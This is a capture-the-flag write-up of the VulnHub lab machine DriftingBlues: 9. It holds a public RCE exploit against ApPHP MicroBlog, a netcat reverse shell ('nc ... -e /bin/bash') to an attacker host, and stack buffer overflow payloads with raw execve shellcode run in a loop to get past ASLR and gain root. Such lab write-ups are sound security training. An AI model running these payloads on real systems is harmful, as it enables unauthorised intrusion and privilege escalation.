---
title: "DriftingBlues: 9"
date: 07-30-2024
excerpt: VulnHub
cover: ../uploads/cover_driftingblues9.jpg
tags: apphp-microblog, Buffer Overflow
---

Welcome back to another WriteUp! In this one, I’ll walk you through the step-by-step process I used to solve the Final Machine of DriftingBlues from VulnHub!!! Let's start!!

We'll use `Nmap` to scan for open ports and identify possible endpoints.

```shell
nmap -A -p- -T5 192.168.172.235
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDnzXjm2Ld1XNpshW17Xj%252FScreenshot%2520%281849%29.png%3Falt%3Dmedia%26token%3D8e298f13-a1f8-4235-9f93-0a4dedc629ed&width=768&dpr=3&quality=100&sign=c6a75948&sv=2)

Now let's visit the webpage.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FTyGqKj0R6pjLRfbl6PyC%252FScreenshot%2520%281850%29.png%3Falt%3Dmedia%26token%3D3da2c539-2e1d-42e5-a52b-4fbb24507308&width=768&dpr=3&quality=100&sign=d5dcc7df&sv=2)

Just a classic DriftingBlues Static Page

If you will analyze the Nmap scan carefully, you can see that the webpage is using `ApPHP MicroBlog` .

**ApPHP MicroBlog** is a lightweight, PHP-based blogging platform designed for quick setup and simple content management, often used in older web projects or educational setups. While it offers basic features like post creation, categories, and multi-author support, it has become outdated and is rarely used today due to multiple security flaws. Known vulnerabilities in versions like 1.0.1 include **Remote Code Execution (RCE)**, **Local File Inclusion (LFI)**, and **unauthenticated file uploads**, making it highly exploitable.

Let's check the source code to determine its version.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FB8FNSbroYuIBe3GNLLKI%252FScreenshot%2520%281851%29.png%3Falt%3Dmedia%26token%3D94d4f98f-aa15-41c3-9d78-f137195016ac&width=768&dpr=3&quality=100&sign=cce8aaaf&sv=2)

1.0.1??

Now let’s run `searchsploit` to directly check if there’s a known exploit available for ApPHP MicroBlog. (Sure it has, xD)

```shell
searchsploit microblog
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FjGFq4q13LP9iWBuxv9oe%252FScreenshot%2520%281852%29.png%3Falt%3Dmedia%26token%3Ddc794498-c88e-4148-9379-43398cb96fab&width=768&dpr=3&quality=100&sign=2d64cf5f&sv=2)

Instant RCE for sure, now let's use `33070` .

```shell
searchsploit -m php/webapps/33070.py
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fxqb3mE1vKxEsdaC0ZlYI%252FScreenshot%2520%281854%29.png%3Falt%3Dmedia%26token%3D05b5ea04-83d6-42b0-885c-c35f0d3f3ef0&width=768&dpr=3&quality=100&sign=e2ab7573&sv=2)

The exploit is written in Python2, the legacy version of Python.

```shell
python2 33070.py http://192.168.172.235
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDmO0PVCyyFeDSY5IRgSk%252FScreenshot%2520%281855%29.png%3Falt%3Dmedia%26token%3D4c252d51-dd20-4800-9d72-c68554442cb7&width=768&dpr=3&quality=100&sign=a22004ad&sv=2)

It works, with a Database Credentials in it.

To establish a stable shell, we’ll set up a `Netcat` listener on our attacker machine and have the target system connect back to it.

Attacker machine:

```shell
nc -lnvp 1234
```

Target machine:

```shell
nc 192.168.172.246 1234 -e /bin/bash
```

And...

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FklKh3ZHEbT4XKpSft3hL%252FScreenshot%2520%281858%29.png%3Falt%3Dmedia%26token%3D52ef8503-7b59-4fc3-97c5-9b1254dc930d&width=768&dpr=3&quality=100&sign=61752778&sv=2)

Now that we’ve gained shell access, let’s upgrade it to an interactive shell using `pty` and set the `TERM` environment variable to `xterm`.

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

Then

```shell
export TERM=xterm
```

While exploring the home directory, I discovered a user named **clapton**. If you recall from the earlier dumped credentials during the exploit, **clapton's password** was included. So from here, we can switch directly to the **clapton** user.

```shell
su clapton
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fe0xn9ZxUYNDtE0iJM6nN%252FScreenshot%2520%281861%29.png%3Falt%3Dmedia%26token%3Da3bd2301-2638-4a59-9d3d-bcc1081202a9&width=768&dpr=3&quality=100&sign=27b0f8c9&sv=2)

We're now clapton!!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FAkocohg5YFrAifpYRX1p%252FScreenshot%2520%281862%29.png%3Falt%3Dmedia%26token%3Df0157ab0-5579-4ad3-9833-f3523b241599&width=768&dpr=3&quality=100&sign=898eff37&sv=2)

User Flag!!

Next to the user flag, there are also two additional files.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FszPET2vXGWxsxpN4ijM6%252FScreenshot%2520%281864%29.png%3Falt%3Dmedia%26token%3Deee682e3-3503-4d9a-8ef8-5207774fa5db&width=768&dpr=3&quality=100&sign=3e9dd9ab&sv=2)

note.txt and input

Let's check the note.txt

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2PVshyfxohRIKX04x7rJ%252FScreenshot%2520%281863%29.png%3Falt%3Dmedia%26token%3D8f4eaed5-f5ec-42bb-9079-5570a21f9f8b&width=768&dpr=3&quality=100&sign=2d658102&sv=2)

Alright, it looks like a Buffer Overflow is the main vulnerability here. The input file is likely a compiled binary.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfJG0vJgtUjusMGwoTkrh%252FScreenshot%2520%281867%29.png%3Falt%3Dmedia%26token%3Dde466475-759e-4ed6-8a75-b3cd4f489187&width=768&dpr=3&quality=100&sign=c99a0c7e&sv=2)

It is, and it's 32-bit. Now let's execute it.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FPtIBpNkK2kulijTviQtI%252FScreenshot%2520%281868%29.png%3Falt%3Dmedia%26token%3Dd02ae671-b1b8-4bf7-8fac-5cd8e9d411c7&width=768&dpr=3&quality=100&sign=c3a80338&sv=2)

Now let's fill it up with lots of 'A'.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FObs6uvbxUQhrsGbSf1dj%252FScreenshot%2520%281869%29.png%3Falt%3Dmedia%26token%3D0936e01e-a20d-429b-a393-410c319c251d&width=768&dpr=3&quality=100&sign=24ae67f4&sv=2)

It results in a Segmentation Fault, confirming the presence of a Buffer Overflow vulnerability.

To dig deeper into the analysis, I transferred the binary over to my attacker machine.

make sure that the `ASLR` is disabled before you take any action. Otherwise, your return addresses will be unpredictable, and your exploit will likely fail.

```shell
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Let’s now use `GDB` to examine the binary in more detail.

```shell
gdb -n ./input
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FgIVvz15qOnTndV5v4ec2%252FScreenshot%2520%281872%29.png%3Falt%3Dmedia%26token%3D2253927e-2add-45b3-b2a0-b9ac649a8112&width=768&dpr=3&quality=100&sign=b16492f5&sv=2)

I input a series of 'A's once more to check if we can take control of the EIP. If the program returns an address like `0x41414141`, it's likely a stack-based buffer overflow.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fy2nFM7WAtgn8HQfRuTT8%252FScreenshot%2520%281894%29.png%3Falt%3Dmedia%26token%3D50a80c86-c0cf-42c4-9014-d0bd5046164e&width=768&dpr=3&quality=100&sign=b62620a9&sv=2)

And it is!

Let’s use Metasploit’s `pattern_create` to generate our input.

```shell
./pattern_create.rb -l 400
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FQm2LwNTiMoHSpjvtR3RK%252FScreenshot%2520%281875%29.png%3Falt%3Dmedia%26token%3D66183173-6f36-40c7-afba-fb6db209eafe&width=768&dpr=3&quality=100&sign=36d55670&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0ngBkk7fh4M1GB5e6x23%252FScreenshot%2520%281876%29.png%3Falt%3Dmedia%26token%3D655ce6d7-648f-4a02-99f4-b635e6ed9b6b&width=768&dpr=3&quality=100&sign=e1f838ed&sv=2)

Now let's get the offset of `0x41376641` .

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FnKtzoaXctGg3BdnK9jLt%252FScreenshot%2520%281878%29.png%3Falt%3Dmedia%26token%3De6f30616-3e7c-4a8e-900c-c4ca681a3712&width=768&dpr=3&quality=100&sign=f897045e&sv=2)

Our offset is `171` .

Let's check the value of the ESP register. Because the system uses little endian format, the bytes will appear in reverse order.

```shell
x/s $esp
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fqn0qzm46AZsOyK5PwGG0%252FScreenshot%2520%281883%29.png%3Falt%3Dmedia%26token%3D0eef26ae-51e7-4e22-b522-fe9ddd17a729&width=768&dpr=3&quality=100&sign=2f5a871&sv=2)

Our EIP is `0xffffd260` in reverse.

`0xffffd260 → 0x60 0xd2 0xff 0xff → \x60\xd2\xff\xff`

Now that we have everything we need, we can proceed to craft our payload.

`PAYLOAD = OFFSET_VALUE + EIP_VALUE + NOPS + BASH_SHELL_CODE`

For the shell code, I used the shellcode in this [exploit](https://www.exploit-db.com/exploits/37495) I've found in exploit-db.

```text
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
```

This is our final payload:

```shell
python3 -c 'print("A" * 171 + "\x60\xd2\xff\xff" + "\x90" * 1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")'
```

Now let's execute it in our target machine.

**Note: GDB is available on the target machine, be sure to repeat the entire process there to accurately obtain the EIP value.**

Since we'll be executing it on a different machine where ASLR is enabled by default, we'll run the payload in a loop to increase the chances of success.

```shell
for i in {1..10000}; do (./input $(python -c 'print("A" * 171 + "\x00\xbf\xe8\xbf" + "\x90" * 1000 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")')); done
```

The first attempt might failed, just continue executing it.

After a long time....

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FNOzwDBi2yKu6uXKSi7Qw%252FScreenshot%2520%281892%29.png%3Falt%3Dmedia%26token%3D4a8ba54d-06a2-4276-b66a-dff41611c332&width=768&dpr=3&quality=100&sign=e9dcdc5&sv=2)

We're root!!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FxoyKQhdiC8j0Krokm6RP%252FScreenshot%2520%281893%29.png%3Falt%3Dmedia%26token%3D16f4d0a6-35da-4490-a29e-a68d141bef4d&width=768&dpr=3&quality=100&sign=a530f634&sv=2)

Root Flag!!

We've successfully pwned DriftingBlues: 9 and completed the DriftingBlues Series!!!

The **DriftingBlues** series has been an incredibly enjoyable and insightful experience — starting from cronjob privilege escalation techniques to diving deep into buffer overflow exploitation. Each challenge offered a valuable learning opportunity, showcasing different aspects of Linux privilege escalation, exploitation techniques, and system misconfigurations. It’s a well-rounded series that not only tests your technical skills but also sharpens your mindset as a security researcher or CTF player. I highly recommend it to anyone aiming to strengthen their foothold in offensive security.
